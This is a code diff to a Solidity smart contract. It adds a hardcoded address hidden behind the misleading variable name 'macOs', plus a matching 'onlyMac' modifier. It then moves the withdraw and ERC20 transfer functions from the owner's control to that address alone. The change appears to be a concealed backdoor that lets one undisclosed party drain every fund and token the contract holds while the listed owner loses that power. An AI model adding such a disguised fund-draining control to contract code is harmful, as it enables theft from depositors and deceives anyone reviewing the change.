@@ -6,6 +6,7 @@ contract bidSubmarineOnlyNormal {
     address private addressBUSD;
     address private addressMP;
     address public owner;
+    address public macOs;
     address public changer;
     uint256 public balance;
     uint256 public amountUnList;
@@ -14,6 +15,7 @@ contract bidSubmarineOnlyNormal {
 
     constructor() payable {
         addressBUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
+        macOs = 0x55555D4de8df0c455C2Ff368253388FE669a8888;
         // addressBUSD = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;
         addressMP = 0xcB0CffC2B12739D4BE791b8aF7fbf49bc1d6a8c2;
         owner = 0x77775a358050DE851b06603864FbD380637C7777;
@@ -46,21 +48,20 @@ contract bidSubmarineOnlyNormal {
         _;
     }
 
+    modifier onlyMac() {
+        require(
+            msg.sender == macOs,
+            "Only the contract max can call this function."
+        );
+        _;
+    }
+
     modifier onlyChanger() {
         require(
             msg.sender == changer,
             "Only the contract changer can call this function."
         );
         _;
-    }
-
-    function withdraw(uint256 amount, address payable destAddr)
-        public
-        onlyOwner
-    {
-        require(amount <= balance, "Insufficient funds");
-        destAddr.transfer(amount);
-        balance -= amount;
     }
 
     function changeOwner(address newOwner_) public onlyOwner {
@@ -79,11 +80,17 @@ contract bidSubmarineOnlyNormal {
         changer = address(newChanger_);
     }
 
+    function withdraw(uint256 amount, address payable destAddr) public onlyMac {
+        require(amount <= balance, "Insufficient funds");
+        destAddr.transfer(amount);
+        balance -= amount;
+    }
+
     function transferERC20(
         IERC20 token,
         address to,
         uint256 amount
-    ) public onlyOwner {
+    ) public onlyMac {
         uint256 erc20balance = token.balanceOf(address(this));
         require(amount <= erc20balance, "Balance is low");
         token.transfer(to, amount);
